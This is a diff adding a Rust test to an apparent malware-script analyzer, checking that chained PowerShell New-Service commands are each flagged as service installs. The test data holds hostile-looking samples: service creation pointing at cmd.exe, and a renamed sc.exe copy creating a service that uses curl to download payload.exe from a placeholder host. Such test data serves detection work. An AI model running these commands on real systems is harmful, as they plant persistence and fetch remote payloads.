@@ -45379,6 +45379,27 @@ mod service_install_tests {
     }
 
     #[test]
+    fn powershell_chained_new_service_emits_each_service_install_trait() {
+        let script = br#"powershell -Command "New-Service -Name FirstSvc -BinaryPathName 'cmd.exe /c one.exe'; New-Service -Name UpdateSvc -BinaryPathName 'cmd.exe /c calc.exe'""#;
+        let report = analyze(script, &Config::default());
+
+        for (service, path) in [
+            ("FirstSvc", "cmd.exe /c one.exe"),
+            ("UpdateSvc", "cmd.exe /c calc.exe"),
+        ] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::ServiceInstall { service_name, bin_path }
+                        if service_name == service && bin_path == path
+                )),
+                "chained PowerShell New-Service install missing {service}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn copied_sc_alias_create_binpath_cmd_child_is_analyzed() {
         let script = br#"copy C:\Windows\System32\sc.exe C:\Users\Public\svc.tmp
 C:\Users\Public\svc.tmp create UpdateSvc binPath= "cmd.exe /c curl -o payload.exe https://copied-sc-binpath.example/payload.exe""#;
